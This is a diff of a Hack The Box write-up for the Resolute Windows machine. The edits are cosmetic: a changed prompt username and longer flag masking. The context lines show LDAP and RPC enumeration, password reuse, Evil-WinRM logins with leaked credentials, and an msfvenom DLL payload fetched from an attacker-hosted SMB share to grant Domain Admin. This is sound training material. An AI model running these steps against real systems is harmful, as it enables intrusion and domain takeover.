@@ -9,6 +9,7 @@ avatar: assets/htb/resolute.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Resolute
 ---
+
 ## Overview
 
 A medium-difficulty Windows box that was fairly straightforward.  Privilege escalation required going through two different users and taking advantage of Windows domain group permissions.  It ended with a privilege escalation route that required a simple dll injection, and a bit of quick reaction.
@@ -46,7 +47,7 @@ A medium-difficulty Windows box that was fairly straightforward.  Privilege esca
 First, I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, `-oA <name>` saves all types of output \(`.nmap`,`.gnmap`, and `.xml`\) with filenames of `<name>`.
 
 ```text
-zweilos@kalimaa:~/htb/resolute$ nmap -sC -sV -oA resolute <YOUR_IP>
+kac0@kalimaa:~/htb/resolute$ nmap -sC -sV -oA resolute <YOUR_IP>
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-23 08:21 EDT
 Nmap scan report for <YOUR_IP>
@@ -107,7 +108,7 @@ From these results we can see there are a lot of ports open! Since ports `88 - k
 Since I had so many options, I decided to start by enumerating Active Directory through LDAP using `ldapsearch`. This command is built into many linux distros and returned a wealth of information. I snipped out huge chunks of the output in order to reduce information overload as most of it was not particularly interesting in this case.
 
 ```text
-zweilos@kalimaa:~/htb/resolute$ ldapsearch -H ldap://<YOUR_IP>:3268 -x -LLL -s sub -b "DC=megabank,DC=local"
+kac0@kalimaa:~/htb/resolute$ ldapsearch -H ldap://<YOUR_IP>:3268 -x -LLL -s sub -b "DC=megabank,DC=local"
 
 dn: DC=megabank,DC=local
 objectClass: top
@@ -1187,7 +1188,7 @@ There was no interesting information in the other users, but I made a list of th
 Next I used `rpcclient` to validate the information I found through LDAP using the `enumdomusers` and `queryuser <rid>` RPC commands.
 
 ```text
-zweilos@kalimaa:~/htb/resolute$ rpcclient -U "" -N <YOUR_IP>
+kac0@kalimaa:~/htb/resolute$ rpcclient -U "" -N <YOUR_IP>
 
 rpcclient $> enumdomusers
 
@@ -1256,7 +1257,7 @@ Hmm...so the user `marko` has no home drive or profile path, and has never logge
 I tried using the creds for `marko` to enumerate SMB but got nothing back. I then tested his password with the users `ryan` and `melanie` and was able to get a share listing with `melanie:Welcome123!`Thank you password reuse!
 
 ```text
-zweilos@kalimaa:~/htb/resolute$ smbclient -U melanie -L //<YOUR_IP>/
+kac0@kalimaa:~/htb/resolute$ smbclient -U melanie -L //<YOUR_IP>/
 Enter WORKGROUP\melanie's password: 
 
         Sharename       Type      Comment
@@ -1272,7 +1273,7 @@ SMB1 disabled -- no workgroup available
 Next, I tried connecting to each of the shares. We only see the standard Windows domain shares, nothing out of the ordinary. Only `NETLOGON` and `SYSVOL` allowed `melanie` to log in, but neither contained anything useful. `SYSVOL` had more folders to browse through, but still nothing useful.
 
 ```text
-zweilos@kalimaa:~/htb/resolute$ smbclient -U melanie //<YOUR_IP>/NETLOGON Welcome123!
+kac0@kalimaa:~/htb/resolute$ smbclient -U melanie //<YOUR_IP>/NETLOGON Welcome123!
 Try "help" to get a list of possible commands.
 smb: \> ls
   .                                   D        0  Wed Sep 25 09:28:21 2019
@@ -1286,7 +1287,7 @@ smb: \> ls
 Since `melanie` is a member of the `Remote Management Users` group, I tried to log in through Windows Remote Management using the `Evil-WinRM` tool, which can be found at [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm).
 
 ```text
-zweilos@kalimaa:~/htb/resolute$ evil-winrm -i <YOUR_IP> -u melanie -p 'Welcome123!'
+kac0@kalimaa:~/htb/resolute$ evil-winrm -i <YOUR_IP> -u melanie -p 'Welcome123!'
 
 Evil-WinRM shell v2.3
 
@@ -1337,7 +1338,7 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 
 *Evil-WinRM* PS C:\Users\melanie\Desktop> cat user.txt
-fc92****11ee
+fc92************************11ee
 ```
 
 ### user.txt
@@ -1369,7 +1370,7 @@ PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.tx
 It seems as if the user `ryan` used the `net use` command to connect to an external share, leaving his credentials `ryan:Serv3r4Admin4cc123!` in the Powershell transcripts! We can now try to login as `ryan` using `Evil-WinRM` since he is also a member of the `Remote Management Users` group.
 
 ```bash
-zweilos@kalimaa:~/htb/resolute$ evil-winrm -u ryan -p 'Serv3r4Admin4cc123!' -i <YOUR_IP>
+kac0@kalimaa:~/htb/resolute$ evil-winrm -u ryan -p 'Serv3r4Admin4cc123!' -i <YOUR_IP>
 
 Evil-WinRM shell v2.3
 
@@ -1437,7 +1438,7 @@ In my case, I was not able to get the dll injection to provide a reverse shell, 
 Since we need to run a command to grant our user `Domain Admin` privileges we need to use the `windows/x64/exec` module. _\(Making sure to choose the right architecture. This machine is x64.\)_ The command `net group "domain admins" ryan /add /domain` will add the user `ryan` to the `domain admins` group.
 
 ```text
-zweilos@kalimaa:~/htb/resolute$ msfvenom -p windows/x64/exec cmd='net group "domain admins" ryan /add /domain' --platform windows -f dll > ~/dns.dll
+kac0@kalimaa:~/htb/resolute$ msfvenom -p windows/x64/exec cmd='net group "domain admins" ryan /add /domain' --platform windows -f dll > ~/dns.dll
 
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder or badchars specified, outputting raw payload
@@ -1452,7 +1453,7 @@ I then hosted my dll on an SMB share so I could access it from the Windows machi
 After logging back in as `ryan` with `Evil-WinRM`,
 
 ```text
-zweilos@kalimaa:~/htb/resolute$ evil-winrm -u ryan -p 'Serv3r4Admin4cc123!' -i <YOUR_IP>
+kac0@kalimaa:~/htb/resolute$ evil-winrm -u ryan -p 'Serv3r4Admin4cc123!' -i <YOUR_IP>
 
 Evil-WinRM shell v2.3
 
@@ -1498,7 +1499,7 @@ SERVICE_NAME: dns
 Back at my SMB server, I saw the incoming connection from the `RESOLUTE` machine. _The dll was only retrieved when the DNS service was restarted, so don't worry if you don't see the request for the file when you run the earlier command._
 
 ```text
-zweilos@kalimaa:/usr/bin$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -debug SHARE ~/
+kac0@kalimaa:/usr/bin$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -debug SHARE ~/
 Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation
 
 [*] Config file parsed
@@ -1524,7 +1525,7 @@ In order for the new permissions to take effect I had to log out of the user and
 
 Info: Exiting with code 0
 
-zweilos@kalimaa:~/htb/resolute$ evil-winrm -u ryan -p 'Serv3r4Admin4cc123!' -i <YOUR_IP>
+kac0@kalimaa:~/htb/resolute$ evil-winrm -u ryan -p 'Serv3r4Admin4cc123!' -i <YOUR_IP>
 
 Evil-WinRM shell v2.3
 
@@ -1611,5 +1612,5 @@ After escalating to `Domain Admin` it was simple to find the root flag on the Ad
 
 ```text
 *Evil-WinRM* PS C:\Users\ryan\Documents> cat ../../Administrator/Desktop/root.txt
-ebdd****465c
+ebdd************************465c
 ```
